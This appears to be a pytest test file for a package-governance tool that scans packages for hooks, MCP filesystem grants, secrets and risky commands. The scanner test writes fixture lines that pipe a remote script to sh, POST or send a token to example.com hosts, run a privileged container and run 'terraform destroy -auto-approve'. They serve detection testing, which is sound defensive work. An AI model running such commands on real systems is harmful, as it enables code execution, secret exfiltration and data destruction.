from __future__ import annotations

import json
import re
from pathlib import Path

from nornyx.cli import main
from nornyx.checker import check_document, has_errors
from nornyx.governed_package import (
    generate_governed_package,
    radar_governed_packages,
    register_existing_package,
    validate_governed_package,
    validate_governed_package_source,
    verify_package_lock,
)
from nornyx.package_scanner import (
    detect_mcp,
    parse_gitleaks_report,
    parse_syft_report,
    run_external_adapters,
    scan_package,
    write_scan_reports,
)
from nornyx.parser import load_nyx


ROOT = Path(__file__).resolve().parents[1]
EXAMPLES = ROOT / "examples" / "governed_package"
PUBLIC_BOUNDARY_MARKERS = [
    "PRIVATE_DOWNSTREAM_PLATFORM",
    "PRIVATE_REPO_MARKER",
    "PRIVATE_PRODUCT_MARKER",
    "INTERNAL_LAB_MARKER",
    "DOWNSTREAM_SYSTEM_MARKER",
    "INTERNAL_CODEBASE_MARKER",
]
PRIVATE_BOUNDARY_MARKER_FIXTURE = """
This synthetic fixture contains PRIVATE_DOWNSTREAM_PLATFORM and PRIVATE_REPO_MARKER.
It must never appear in generated public artifacts.
"""


def _codes(path: Path) -> set[str]:
    diagnostics = validate_governed_package_source(path)
    return {item.code for item in diagnostics}


def _error_codes(path: Path) -> set[str]:
    diagnostics = validate_governed_package_source(path)
    return {item.code for item in diagnostics if item.level == "error"}


def _read_json(path: Path) -> dict:
    return json.loads(path.read_text(encoding="utf-8"))


def _marker_pattern() -> re.Pattern[str]:
    return re.compile("|".join(re.escape(term) for term in PUBLIC_BOUNDARY_MARKERS))


def test_public_boundary_markers_are_neutral_synthetic_names() -> None:
    marker_shape = re.compile(r"^(PRIVATE|INTERNAL|DOWNSTREAM)_[A-Z_]+(_MARKER|_PLATFORM)$")

    assert PUBLIC_BOUNDARY_MARKERS
    assert all(marker_shape.fullmatch(marker) for marker in PUBLIC_BOUNDARY_MARKERS)
    assert "PRIVATE_DOWNSTREAM_PLATFORM" in PRIVATE_BOUNDARY_MARKER_FIXTURE


def test_parses_valid_governed_package_example() -> None:
    doc = load_nyx(EXAMPLES / "basic.nyx")

    assert doc["governed_package"]["profile"] == "governed_package"
    assert doc["governed_package"]["package_id"] == "gp-example-001"


def test_basic_example_validates() -> None:
    assert validate_governed_package_source(EXAMPLES / "basic.nyx") == []


def test_software_change_example_validates() -> None:
    assert validate_governed_package_source(EXAMPLES / "software_change.nyx") == []


def test_nornyx_check_accepts_valid_governed_package_block() -> None:
    diagnostics = check_document(load_nyx(EXAMPLES / "basic.nyx"))

    assert not has_errors(diagnostics), [item.to_dict() for item in diagnostics]


def test_rejects_execution_surface_as_approver() -> None:
    codes = _codes(EXAMPLES / "invalid_ai_tool_approver.nyx")

    assert "INVALID_APPROVER_EXECUTION_SURFACE" in codes


def test_rejects_unsafe_installation_policy() -> None:
    codes = _codes(EXAMPLES / "invalid_unsafe_flags.nyx")

    assert "UNSAFE_INSTALLATION_POLICY_INSTALLED" in codes
    assert "UNSAFE_INSTALLATION_POLICY_EXECUTABLE_BY_DEFAULT" in codes


def test_rejects_unsafe_safety_flags() -> None:
    codes = _codes(EXAMPLES / "invalid_unsafe_flags.nyx")

    assert "UNSAFE_SAFETY_BOUNDARY_SECRETS_ALLOWED" in codes
    assert "UNSAFE_SAFETY_BOUNDARY_DEPLOYMENT_ALLOWED" in codes


def test_generate_mode_creates_inert_package_manifest_and_lock(tmp_path: Path) -> None:
    generate_governed_package(EXAMPLES / "basic.nyx", tmp_path)
    manifest = _read_json(tmp_path / "package_manifest.json")
    lock = _read_json(tmp_path / "package_lock.json")

    assert manifest["profile"] == "governed_package"
    assert manifest["installation_policy"]["installed"] is False
    assert manifest["installation_policy"]["executable_by_default"] is False
    assert manifest["safety_boundary"]["deployment_allowed"] is False
    assert lock["profile"] == "governed_package"
    assert lock["artifact_hashes"]
    assert not verify_package_lock(tmp_path)


def test_detects_modified_generated_artifact_hash_mismatch(tmp_path: Path) -> None:
    generate_governed_package(EXAMPLES / "basic.nyx", tmp_path)
    (tmp_path / "AGENTS.md").write_text("modified\n", encoding="utf-8")

    diagnostics = verify_package_lock(tmp_path)

    assert any(item.code == "PACKAGE_LOCK_ARTIFACT_HASH_MISMATCH" for item in diagnostics)


def test_register_existing_mode_locks_existing_artifact_directory(tmp_path: Path) -> None:
    source = tmp_path / "existing"
    (source / "docs").mkdir(parents=True)
    (source / "README.md").write_text("# Existing\n", encoding="utf-8")
    (source / "docs" / "summary.md").write_text("# Summary\n", encoding="utf-8")
    out = tmp_path / "registered"

    register_existing_package(source, out, contract=EXAMPLES / "register_existing.nyx")
    manifest = _read_json(out / "package_manifest.json")

    assert manifest["registration_mode"] == "existing"
    assert all(item["sha256"] for item in manifest["artifacts"])
    assert not _error_codes(out)


def test_register_existing_mode_detects_source_artifact_hash_mismatch(
    tmp_path: Path,
    monkeypatch,
) -> None:
    monkeypatch.chdir(tmp_path)
    source = tmp_path / "existing"
    source.mkdir()
    artifact = source / "README.md"
    artifact.write_text("# Existing\n", encoding="utf-8")
    out = tmp_path / "registered"

    register_existing_package(source, out, contract=EXAMPLES / "register_existing.nyx")
    artifact.write_text("# Modified\n", encoding="utf-8")

    diagnostics = validate_governed_package_source(out)

    assert any(item.code == "REGISTERED_ARTIFACT_HASH_MISMATCH" for item in diagnostics)


def test_register_existing_mode_rejects_unsafe_manifest(tmp_path: Path) -> None:
    out = tmp_path / "unsafe"
    generate_governed_package(EXAMPLES / "basic.nyx", out)
    manifest_path = out / "package_manifest.json"
    manifest = _read_json(manifest_path)
    manifest["installation_policy"]["installed"] = True
    manifest_path.write_text(json.dumps(manifest, indent=2), encoding="utf-8")

    codes = _codes(manifest_path)

    assert "UNSAFE_INSTALLATION_POLICY_INSTALLED" in codes


def test_radar_mode_detects_candidate_package_from_sample_repo(tmp_path: Path) -> None:
    report = radar_governed_packages(EXAMPLES / "radar_sample_repo", tmp_path / "radar_report.json")

    assert report["proposal_only"] is True
    assert report["candidate_packages"]
    assert report["candidate_packages"][0]["artifacts"]
    assert report["inferred_risk_tier"] == "high"


def test_radar_mode_is_proposal_only_and_inert(tmp_path: Path) -> None:
    report = radar_governed_packages(EXAMPLES / "radar_sample_repo", tmp_path / "radar_report.json")

    assert report["proposal_only"] is True
    assert report["installed"] is False
    assert report["executable_by_default"] is False
    assert report["installation_policy"]["installed"] is False
    assert report["installation_policy"]["executable_by_default"] is False
    assert report["suggested_approval_gates"][0]["eligible_approver_roles"] == ["reviewer"]


def test_radar_mode_does_not_copy_secret_like_values(tmp_path: Path) -> None:
    report_path = tmp_path / "radar_report.json"
    radar_governed_packages(EXAMPLES / "radar_sample_repo", report_path)
    text = report_path.read_text(encoding="utf-8")

    assert "replace-me" not in text
    assert "possible_secret" in text


def test_radar_mode_does_not_copy_private_boundary_marker_values(tmp_path: Path) -> None:
    source = tmp_path / "source"
    source.mkdir()
    (source / "README.md").write_text("# Candidate\n", encoding="utf-8")
    marker = PUBLIC_BOUNDARY_MARKERS[0]
    (source / "notes.txt").write_text(f"API_TOKEN={marker}\n", encoding="utf-8")
    report_path = tmp_path / "radar_report.json"

    radar_governed_packages(source, report_path)
    text = report_path.read_text(encoding="utf-8")

    assert not _marker_pattern().search(text)
    assert "possible_secret" in text


def test_radar_suggest_contract_writes_contract_and_report(tmp_path: Path) -> None:
    contract_path = tmp_path / "radar_suggested.nyx"
    report = radar_governed_packages(
        EXAMPLES / "radar_sample_repo",
        contract_path,
        suggest_contract=True,
    )

    assert contract_path.exists()
    assert Path(report["report_path"]).exists()
    assert report["suggested_contract_ref"] == contract_path.as_posix()


def test_radar_suggest_contract_rejects_report_path_collision(tmp_path: Path) -> None:
    report_path = tmp_path / "radar_report.json"

    try:
        radar_governed_packages(EXAMPLES / "radar_sample_repo", report_path, suggest_contract=True)
    except ValueError as exc:
        assert "collides with radar report path" in str(exc)
    else:
        raise AssertionError("radar accepted a suggested contract path that collides with the report")


def test_package_radar_cli_suggest_contract_default_writes_contract_and_report(
    tmp_path: Path,
    monkeypatch,
) -> None:
    monkeypatch.chdir(tmp_path)

    assert main(["package", "radar", str(EXAMPLES / "radar_sample_repo"), "--suggest-contract"]) == 0

    contract_path = tmp_path / "dist" / "radar_suggested.nyx"
    report_path = tmp_path / "dist" / "radar_report.json"
    report = _read_json(report_path)

    assert contract_path.exists()
    assert report_path.exists()
    assert report["suggested_contract_ref"].endswith("radar_suggested.nyx")
    assert main(["package", "validate", str(contract_path)]) == 0
    assert main(["check", str(contract_path)]) == 0


def test_all_three_modes_produce_provenance_and_remain_inert(tmp_path: Path) -> None:
    generated = tmp_path / "generated"
    registered_source = tmp_path / "registered-source"
    registered_source.mkdir()
    (registered_source / "README.md").write_text("# Existing\n", encoding="utf-8")
    registered = tmp_path / "registered"
    radar_path = tmp_path / "radar.json"

    generate_governed_package(EXAMPLES / "basic.nyx", generated)
    register_existing_package(registered_source, registered, contract=EXAMPLES / "register_existing.nyx")
    radar = radar_governed_packages(EXAMPLES / "radar_sample_repo", radar_path)

    for manifest_path in [generated / "package_manifest.json", registered / "package_manifest.json"]:
        manifest = _read_json(manifest_path)
        assert manifest["provenance"]["source_sha256"]
        assert manifest["installation_policy"]["installed"] is False
        assert manifest["installation_policy"]["executable_by_default"] is False
    assert radar["provenance"]["source_sha256"]
    assert radar["installation_policy"]["installed"] is False
    assert radar["installation_policy"]["executable_by_default"] is False


def test_all_three_modes_reject_or_avoid_execution_surface_approvers(tmp_path: Path) -> None:
    generated_codes = _codes(EXAMPLES / "invalid_ai_tool_approver.nyx")
    assert "INVALID_APPROVER_EXECUTION_SURFACE" in generated_codes

    source = tmp_path / "source"
    source.mkdir()
    (source / "README.md").write_text("# Existing\n", encoding="utf-8")
    out = tmp_path / "registered-invalid"
    try:
        register_existing_package(source, out, contract=EXAMPLES / "invalid_ai_tool_approver.nyx")
    except ValueError as exc:
        assert "execution surfaces and AI tools cannot be eligible approvers" in str(exc)
    else:
        raise AssertionError("register existing accepted an execution surface approver")

    radar = radar_governed_packages(EXAMPLES / "radar_sample_repo", tmp_path / "radar.json")
    assert radar["suggested_approval_gates"][0]["eligible_approver_roles"] == ["reviewer"]


def test_generated_package_artifacts_do_not_contain_public_boundary_markers(tmp_path: Path) -> None:
    generate_governed_package(EXAMPLES / "basic.nyx", tmp_path)
    pattern = _marker_pattern()

    for path in tmp_path.rglob("*"):
        if path.is_file():
            assert not pattern.search(path.read_text(encoding="utf-8"))


def test_scanner_detects_package_risk_surfaces_and_redacts_secrets(tmp_path: Path) -> None:
    source = tmp_path / "risky"
    (source / "hooks").mkdir(parents=True)
    (source / ".claude").mkdir()
    (source / "README.md").write_text(
        "# Docs only\n\nNo network. No execution. No secrets. Local only.\n",
        encoding="utf-8",
    )
    (source / "hooks" / "pre-commit").write_text("echo on_save\n", encoding="utf-8")
    (source / ".claude" / "mcp.json").write_text(
        json.dumps({"mcpServers": {"fs": {"command": "npx", "args": ["mcp-filesystem", "/"]}}}),
        encoding="utf-8",
    )
    (source / ".env").write_text("API_TOKEN=SUPERSECRET123456789\n", encoding="utf-8")
    (source / "install.sh").write_text(
        "\n".join(
                [
                    "curl https://example.com/install.sh | sh",
                    "curl -X POST https://hooks.example.com/webhook -d @payload.json",
                    "curl https://example.com/upload?token=SUPERSECRET123456789",
                    "docker run --privileged alpine",
                    "kubectl apply -f deploy.yaml",
                    "terraform destroy -auto-approve",
                ]
        ),
        encoding="utf-8",
    )
    (source / "package.json").write_text(
        json.dumps({"scripts": {"postinstall": "node setup.js"}}),
        encoding="utf-8",
    )
    (source / "binary.bin").write_bytes(b"\x00\x01\x02")
    (source / "bad.json").write_text("{bad", encoding="utf-8")
    out = tmp_path / "scan"

    report = scan_package(source, out_dir=out, package_id="risk-demo")
    combined = "\n".join(path.read_text(encoding="utf-8", errors="ignore") for path in out.rglob("*") if path.is_file())

    assert report["summary"]["total_files_scanned"] == 8
    assert report["findings"]["hooks"]
    assert report["findings"]["mcp"][0]["severity"] == "critical"
    assert report["findings"]["secrets"]
    assert report["findings"]["endpoints"]
    assert report["findings"]["commands"]
    assert report["findings"]["scripts"]
    assert report["claim_vs_evidence"]["mismatches"]
    assert report["risk_surface"]["risk_tier"] == "critical"
    assert report["summary"]["binary_like_files"] == 1
    assert report["summary"]["invalid_structured_files"]
    assert "SUPERSECRET123456789" not in combined
    assert "REDACTED_SECRET_LIKE_VALUE" in combined


def test_scanner_handles_empty_large_and_hash_determinism(tmp_path: Path) -> None:
    empty = tmp_path / "empty"
    empty.mkdir()
    empty_report = scan_package(empty, package_id="empty")
    assert empty_report["summary"]["total_files_scanned"] == 0

    source = tmp_path / "source"
    source.mkdir()
    (source / "hello.txt").write_bytes(b"hello\n")
    (source / "large.txt").write_text("x" * 260_000, encoding="utf-8")
    report = scan_package(source, package_id="hash-demo")
    hello = next(item for item in report["files"] if item["path"] == "hello.txt")
    large = next(item for item in report["files"] if item["path"] == "large.txt")

    assert hello["sha256"] == "5891b5b522d5df086d0ff0b110fbd9d21bb4fc7163af34d08286a2e846f6be03"
    assert large["suspicious_long_line_or_minified"] is True


def test_package_generate_and_register_include_analysis_reports(tmp_path: Path) -> None:
    generated = tmp_path / "generated"
    generate_governed_package(EXAMPLES / "basic.nyx", generated)
    for name in ["package_analysis.json", "risk_surface_report.md", "source_inventory.md"]:
        assert (generated / name).exists()
    lock = _read_json(generated / "package_lock.json")
    assert lock["scanner_report_hash"]
    assert lock["source_inventory_hash"]
    assert lock["generated_governance_file_hashes"]

    source = tmp_path / "source"
    source.mkdir()
    (source / "README.md").write_text("# Registered\n", encoding="utf-8")
    registered = tmp_path / "registered"
    register_existing_package(source, registered, contract=EXAMPLES / "register_existing.nyx")
    manifest = _read_json(registered / "package_manifest.json")
    assert manifest["blocked_by_default"] is True
    assert manifest["approval_required"] is True
    assert (registered / "package_analysis.json").exists()


def test_validation_fails_when_scan_obligations_are_missing() -> None:
    package = load_nyx(EXAMPLES / "basic.nyx")["governed_package"]
    package["scan_metadata"] = {
        "risk_surface_counts": {"hooks": 1, "mcp": 1, "secrets": 1},
        "claim_mismatch_count": 1,
        "claim_mismatch_max_severity": "critical",
        "adapter_status": {"gitleaks": "unavailable"},
        "external_critical_findings": 1,
    }
    package["evidence_adapters"] = [
        {"name": "gitleaks", "required": True, "failure_policy": "fail"},
    ]
    package["evidence"]["requirements"] = [
        item for item in package["evidence"]["requirements"] if item["id"] == "doc_diff"
    ]

    codes = {item.code for item in validate_governed_package(package) if item.level == "error"}

    assert "HOOKS_REQUIRE_HOOK_RISK_REVIEW" in codes
    assert "MCP_REQUIRES_MCP_RISK_REVIEW" in codes
    assert "SECRETS_REQUIRE_SECRET_SCAN_EVIDENCE" in codes
    assert "CLAIM_MISMATCH_REQUIRES_EVIDENCE" in codes
    assert "REQUIRED_ADAPTER_UNAVAILABLE" in codes
    assert "CRITICAL_EXTERNAL_EVIDENCE_REQUIRES_SECURITY_GATE" in codes


def test_external_adapter_parsers_normalize_fake_reports_without_raw_secrets(tmp_path: Path) -> None:
    syft_report = tmp_path / "syft.json"
    syft_report.write_text(
        json.dumps({"descriptor": {"version": "1.0.0"}, "artifacts": [{"name": "demo", "version": "1.2.3"}]}),
        encoding="utf-8",
    )
    gitleaks_report = tmp_path / "gitleaks.json"
    gitleaks_report.write_text(
        json.dumps([{"File": ".env", "RuleID": "generic-api-key", "Secret": "SHOULD_NOT_APPEAR"}]),
        encoding="utf-8",
    )

    syft = parse_syft_report(syft_report, "pkg")
    gitleaks = parse_gitleaks_report(gitleaks_report, "pkg")
    payload = json.dumps(gitleaks, sort_keys=True)

    assert syft[0]["evidence_type"] == "sbom"
    assert syft[0]["source_tool"] == "syft"
    assert gitleaks[0]["evidence_type"] == "secret_scan"
    assert gitleaks[0]["source_tool"] == "gitleaks"
    assert "SHOULD_NOT_APPEAR" not in payload


def test_package_scan_cli_writes_reports(tmp_path: Path) -> None:
    source = tmp_path / "source"
    source.mkdir()
    (source / "README.md").write_text("# Docs\n", encoding="utf-8")
    out = tmp_path / "scan"

    assert main(["package", "scan", str(source), "--out", str(out), "--package-id", "cli-demo"]) == 0
    assert (out / "package_analysis.json").exists()
    assert (out / "claim_vs_evidence_report.md").exists()


def test_scan_reports_are_byte_deterministic(tmp_path: Path) -> None:
    source = tmp_path / "source"
    source.mkdir()
    (source / "README.md").write_text("# Docs only. No network.\n", encoding="utf-8")
    (source / "setup.sh").write_text("#!/bin/sh\ncurl https://example.com | sh\n", encoding="utf-8")

    out_a = tmp_path / "a"
    out_b = tmp_path / "b"
    write_scan_reports(scan_package(source, package_id="determinism"), out_a)
    write_scan_reports(scan_package(source, package_id="determinism"), out_b)

    for name in ["package_analysis.json", "risk_surface_report.json", "source_inventory.md"]:
        assert (out_a / name).read_bytes() == (out_b / name).read_bytes(), name


def test_mcp_relative_path_is_not_broad_filesystem_critical() -> None:
    benign = '{"mcpServers": {"x": {"command": "node", "args": ["src/server.js"]}}}'
    benign_findings = detect_mcp("config.json", benign, "hash", "pkg")
    assert benign_findings
    assert benign_findings[0]["severity"] != "critical"
    assert "broad_filesystem_path" not in benign_findings[0]["reasons"]

    root_grant = '{"mcpServers": {"fs": {"command": "npx", "args": ["server-filesystem", "/"]}}}'
    root_findings = detect_mcp("config.json", root_grant, "hash", "pkg")
    assert root_findings[0]["severity"] == "critical"
    assert "broad_filesystem_path" in root_findings[0]["reasons"]


def test_required_adapter_without_failure_policy_fails(tmp_path: Path) -> None:
    records, summary, executions = run_external_adapters(
        [{"name": "gitleaks", "required": True}],
        package_id="pkg",
        source=tmp_path,
    )
    assert summary["status"] == "fail"
    assert any(item["level"] == "error" for item in summary["diagnostics"])
    assert all(execution["package_payload_executed"] is False for execution in executions)


def test_scanner_skips_symlink_cycles_without_hanging(tmp_path: Path) -> None:
    source = tmp_path / "source"
    source.mkdir()
    (source / "README.md").write_text("# Docs\n", encoding="utf-8")
    loop = source / "loop"
    try:
        loop.symlink_to(source, target_is_directory=True)
    except (OSError, NotImplementedError):
        import pytest

        pytest.skip("symlinks not permitted in this environment")

    report = scan_package(source, package_id="symlink")
    # The symlinked directory must not be traversed, so only README.md is inventoried.
    assert [item["path"] for item in report["files"]] == ["README.md"]


def test_public_docs_examples_and_source_do_not_contain_public_boundary_markers() -> None:
    roots = [
        ROOT / "docs" / "governed-package-profile.md",
        ROOT / "examples" / "governed_package",
        ROOT / "nornyx" / "governed_package.py",
        ROOT / "nornyx" / "schemas" / "governed_package.schema.json",
    ]
    pattern = _marker_pattern()

    for root in roots:
        paths = [root] if root.is_file() else [item for item in root.rglob("*") if item.is_file()]
        for path in paths:
            assert not pattern.search(path.read_text(encoding="utf-8"))
